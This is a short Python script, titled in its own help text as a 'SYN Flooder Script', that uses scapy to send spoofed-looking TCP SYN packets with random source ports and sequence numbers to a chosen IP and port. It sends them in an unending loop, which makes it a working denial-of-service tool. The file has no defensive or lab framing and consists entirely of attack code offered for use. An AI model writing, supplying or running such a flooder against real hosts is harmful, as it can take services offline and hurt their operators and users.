from scapy.all import *
import socket,sys,time,random,argparse

def randInt():
    x = random.randint(1,65535)
    return x

def sendPacket(target,port):
    sport = randInt()
    seq = randInt()
    window = randInt()

    IP_PACKET = IP()
    IP_PACKET.dst = target

    TCP_PACKET        = TCP()
    TCP_PACKET.sport  = sport # SOURCE PORT
    TCP_PACKET.dport  = int(port) # DESTINATION PORT
    TCP_PACKET.flags  = "S" # SYN
    TCP_PACKET.seq    = seq
    TCP_PACKET.window = window

    try:
        send(IP_PACKET/TCP_PACKET)
    except:
        pass

def attack(target,port):
    while True:
        sendPacket(target,port)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="SYN Flooder Script")
    parser.add_argument('-t','--target',help="IP of target", type=str, metavar="<ip>")
    parser.add_argument('-p','--port',help="Port to attack", type=int, metavar="<port>", default=80)
    arguments = parser.parse_args()
    if arguments.target is None:
        sys.exit(parser.print_help())
    attack(arguments.target,arguments.port)